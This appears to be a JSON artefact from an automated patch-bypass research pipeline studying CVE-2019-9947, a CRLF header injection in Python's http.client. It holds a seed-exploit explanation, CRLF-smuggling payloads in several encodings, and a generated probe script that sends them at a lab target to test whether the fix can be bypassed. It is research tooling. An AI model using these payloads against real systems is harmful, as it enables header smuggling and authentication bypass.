@@ -1,0 +1,283 @@
+{
+  "case_dir": "PCBV2-0006",
+  "a_paper_version": "1.0",
+  "k_limit": 8,
+  "n_limit": 4,
+  "status": "candidates_ready",
+  "P": {
+    "methods": [
+      "\"http://{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:\".format",
+      "build_url",
+      "print",
+      "json.dumps",
+      "candidate"
+    ],
+    "paths": [
+      "http://{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:"
+    ],
+    "params": [
+      "ip",
+      "port",
+      "s",
+      "id",
+      "url",
+      "component",
+      "indent"
+    ],
+    "dangerous_spans": [],
+    "assert_literals": [],
+    "all_string_literals": [
+      "[GIVEN] CVE-2019-9947 seed exploit -- CRLF header injection via the URL PATH.\n\nThe attacker controls the URL passed to urllib.request.urlopen(). Before the\nCVE-2019-9947 fix, http.client put the URL path straight into the request line\n(`GET <path> HTTP/1.1`) with no control-character check, so a path containing\n` HTTP/1.1\\\\r\\\\nX-PCB-Auth: ...` splits the request line and smuggles an extra\nheader into the outgoing request. The trailing `Z:` dummy header absorbs the\n`' HTTP/1.1'` that http.client appends after the URL, so the injected\n`X-PCB-Auth` line is emitted cleanly.\n\n  V0 python 3.7.2: no _validate_path  -> path CRLF accepted -> X-PCB-Auth reaches\n                   the sidecar -> ${PCB_FLAG} (seed reaches).\n  V1 python 3.7.4: _validate_path rejects control chars in the URL (CVE-2019-9947\n                   fix) -> InvalidURL raised -> BLOCKED (seed closed).\n\nThe residual (host-component variant) is the SAME sink area (http.client\nputrequest / the _contains_disallowed_url_pchar_re control-char check) but a\ncomponent the CVE-2019-9947 fix left unguarded -- see _heldout/bypass_poc.py.\n",
+      "10.89.0.2",
+      "PCB-AUTH-7f3a",
+      "http://{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:",
+      "id",
+      "cve-2019-9947-path-crlf",
+      "url",
+      "component",
+      "path",
+      "__main__"
+    ]
+  },
+  "O": {
+    "added_comparison_literals": [],
+    "removed_comparison_literals": [],
+    "new_calls": [
+      {
+        "name": "InvalidURL",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "name": "match.group",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "name": "re.compile",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "name": "chr",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "list",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "range",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "replace",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "repr",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "resp.geturl",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "self.assertNotIn",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "self.assertRaisesRegex",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "self.fakehttp",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "self.unfakehttp",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "unittest.skipUnless",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "urllib.request.urlopen",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "urlopen",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "name": "conn.send",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "name": "encode",
+        "file": "Lib/test/test_xmlrpc.py"
+      }
+    ],
+    "changed_functions": [],
+    "new_string_constants": [
+      {
+        "value": "[\\x00-\\x20\\x7f]",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": "\\x00",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": "URL can't contain control characters. ",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": "(found at least ",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": ")",
+        "file": "Lib/http/client.py"
+      },
+      {
+        "value": "ssl module required",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "//localhost:7777/test",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "/",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "HTTP/1.1 200 OK\\r\\n\\r\\nHello.",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "\\r",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "\\\\",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "r'\\\\'",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "contain control.*",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "http:",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "https:",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "localhost:7777?a=1 HTTP/1.1\\r\\nX-injected: header\\r\\nTEST: 123",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "//",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": ":8080/test/?test=a",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "contain control.*\\\\r.*(found at least . .)",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "contain control.*\\\\n",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "\\n",
+        "file": "Lib/test/test_urllib.py"
+      },
+      {
+        "value": "POST /RPC2 HTTP/1.0\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "\\r",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "Content-Length: 100\\r\\n\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "bye HTTP/1.1\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "Host: ",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": ":",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "Accept-Encoding: identity\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "Content-Length: 0\\r\\n\\r\\n",
+        "file": "Lib/test/test_xmlrpc.py"
+      },
+      {
+        "value": "ascii",
+        "file": "Lib/test/test_xmlrpc.py"
+      }
+    ],
+    "new_regex_patterns": [],
+    "files_touched": [
+      "Lib/http/client.py",
+      "Lib/test/test_urllib.py",
+      "Lib/test/test_xmlrpc.py"
+    ],
+    "is_empty": false
+  },
+  "D": {
+    "skipped": "no source_dir provided"
+  },
+  "a_paper_candidates": 217,
+  "a_code_candidates": 29,
+  "siblings": [],
+  "sibling_count": 0,
+  "candidate_summary": {
+    "a_paper_count": 217,
+    "a_code_count": 29,
+    "sibling_count": 0,
+    "total": 246,
+    "a_paper_families": [
+      "overlong",
+      "backslash",
+      "double",
+      "case",
+      "html",
+      "dot",
+      "null",
+      "percent",
+      "ws",
+      "slash",
+      "unicode"
+    ],
+    "a_paper_version": "1.0"
+  },
+  "graph_connectivity": {
+    "entry_to_sink_connected": false,
+    "reason": "no tool graph"
+  },
+  "test_template": "\"\"\"Residual test: auto-generated by static pipeline.\n\nPath: http://{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:\nMethod: GET\nO obligations: []\nO removed: []\nN limit: 4\nA_paper version: 1.0\n\"\"\"\n\nimport os\nimport sys\nimport json\nimport urllib.request\nimport urllib.error\n\nBASE_URL = os.environ.get(\"BASE_URL\", \"http://localhost:8080\")\nMARKER = os.environ.get(\"MARKER\", \"\")\nMAX_ATTEMPTS = 4\n\n# Obligation set from AST diff\nO_ADDED = []\nO_REMOVED = []\n\n# A_paper candidates (encoding families on dangerous spans)\nA_PAPER = [\n    \"%68%74%74%70%3A%2F%2F%7B%69%70%7D%3A%7B%70%6F%72%74%7D%2F%78%20%48%54%54%50%2F%31%2E%31%5C%72%5C%6E%58%2D%50%43%42%2D%41%75%74%68%3A%20%7B%73%7D%5C%72%5C%6E%5A%3A\",  # percent-full\n    \"%2568%2574%2574%2570%253A%252F%252F%257B%2569%2570%257D%253A%257B%2570%256F%2572%2574%257D%252F%2578%2520%2548%2554%2554%2550%252F%2531%252E%2531%255C%2572%255C%256E%2558%252D%2550%2543%2542%252D%2541%2575%2574%2568%253A%2520%257B%2573%257D%255C%2572%255C%256E%255A%253A\",  # double-percent-full\n    \"&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#123;&#105;&#112;&#125;&#58;&#123;&#112;&#111;&#114;&#116;&#125;&#47;&#120;&#32;&#72;&#84;&#84;&#80;&#47;&#49;&#46;&#49;&#92;&#114;&#92;&#110;&#88;&#45;&#80;&#67;&#66;&#45;&#65;&#117;&#116;&#104;&#58;&#32;&#123;&#115;&#125;&#92;&#114;&#92;&#110;&#90;&#58;\",  # html-numeric-full\n    \"http%3A//{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # percent@4\n    \"http%253A//{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # double-percent@4\n    \"http%C0%BA//{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # overlong-utf8-2@4\n    \"http%E0%80%BA//{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # overlong-utf8-3@4\n    \"http\\\\u003A//{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # unicode-escape@4\n    \"http&#58;//{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # html-numeric@4\n    \"http&#x3A;//{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # html-hex@4\n    \"http\\\\x3A//{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # backslash@4\n    \"http:%2F/{ip}:{port}/x HTTP/1.1\\\\r\\\\nX-PCB-Auth: {s}\\\\r\\\\nZ:\",  # percent@5\n]\n\n# A_code candidates (source literals)\nA_CODE = [\n    \"[\\\\x00-\\\\x20\\\\x7f]\",  # O:new_string:Lib/http/client.py\n    \"\\\\x00\",  # O:new_string:Lib/http/client.py\n    \"URL can't contain control characters. \",  # O:new_string:Lib/http/client.py\n    \"(found at least \",  # O:new_string:Lib/http/client.py\n    \")\",  # O:new_string:Lib/http/client.py\n    \"ssl module required\",  # O:new_string:Lib/test/test_urllib.py\n    \"//localhost:7777/test\",  # O:new_string:Lib/test/test_urllib.py\n    \"/\",  # O:new_string:Lib/test/test_urllib.py\n    \"HTTP/1.1 200 OK\\\\r\\\\n\\\\r\\\\nHello.\",  # O:new_string:Lib/test/test_urllib.py\n    \"\\\\r\",  # O:new_string:Lib/test/test_urllib.py\n    \"\\\\\\\\\",  # O:new_string:Lib/test/test_urllib.py\n    \"r'\\\\\\\\'\",  # O:new_string:Lib/test/test_urllib.py\n]\n\nSIBLINGS = []\n\n\ndef probe(candidate_value: str) -> dict:\n    \"\"\"Send a black-box probe to V1 via GET http://{ip}:{port}/x HTTP/1.1\\r\\nX-PCB-Auth: {s}\\r\\nZ:.\"\"\"\n    url = BASE_URL.rstrip(\"/\") + candidate_value\n    req = urllib.request.Request(url, method=\"GET\")\n    req.add_header(\"User-Agent\", \"residual-test/1.0\")\n    try:\n        with urllib.request.urlopen(req, timeout=10) as resp:\n            body = resp.read().decode(\"utf-8\", errors=\"replace\")\n            headers = dict(resp.headers)\n            return {\"status\": resp.status, \"body\": body, \"headers\": headers}\n    except urllib.error.HTTPError as e:\n        body = e.read().decode(\"utf-8\", errors=\"replace\") if e.fp else \"\"\n        return {\"status\": e.code, \"body\": body, \"headers\": dict(e.headers)}\n    except Exception as e:\n        return {\"status\": \"error\", \"body\": str(e), \"headers\": {}}\n\n\ndef check_effect(response: dict) -> dict:\n    \"\"\"Check if the external effect marker appears in response.\"\"\"\n    body = response.get(\"body\", \"\")\n    headers = response.get(\"headers\", {})\n    \n    # Check body for marker\n    if MARKER and MARKER in body:\n        return {\"found\": True, \"location\": \"body\", \"marker\": MARKER}\n    \n    # Check headers for marker\n    for hname, hval in headers.items():\n        if MARKER and MARKER in str(hval):\n            return {\"found\": True, \"location\": f\"header:{hname}\", \"marker\": MARKER}\n    \n    return {\"found\": False}\n\n\ndef run():\n    \"\"\"Run candidates against V1, up to N attempts.\"\"\"\n    witnesses = []\n    attempts = 0\n    \n    all_candidates = []\n    for c in A_PAPER:\n        all_candidates.append((\"a_paper\", c))\n    for c in A_CODE:\n        all_candidates.append((\"a_code\", c))\n    for c in SIBLINGS:\n        all_candidates.append((\"sibling\", c))\n    \n    for source, candidate in all_candidates:\n        if attempts >= MAX_ATTEMPTS:\n            break\n        \n        attempts += 1\n        resp = probe(candidate)\n        effect = check_effect(resp)\n        \n        result = {\n            \"candidate\": candidate,\n            \"source\": source,\n            \"status\": resp[\"status\"],\n            \"effect\": effect,\n        }\n        \n        if effect.get(\"found\"):\n            # Check obligation binding\n            bound_o = None\n            for o_lit in O_ADDED + O_REMOVED:\n                if o_lit in candidate or any(o_lit in str(v) for v in [candidate]):\n                    bound_o = o_lit\n                    break\n            result[\"obligation_binding\"] = bound_o\n            result[\"verdict\"] = \"witness\" if bound_o else \"effect_only\"\n            witnesses.append(result)\n        else:\n            result[\"verdict\"] = \"no_effect\"\n    \n    return {\n        \"attempts\": attempts,\n        \"witnesses\": witnesses,\n        \"total_candidates\": len(all_candidates),\n    }\n\n\nif __name__ == \"__main__\":\n    if not MARKER:\n        print(\"Warning: MARKER not set\", file=sys.stderr)\n    result = run()\n    print(json.dumps(result, indent=2))\n",
+  "elapsed_s": 0.0
+}
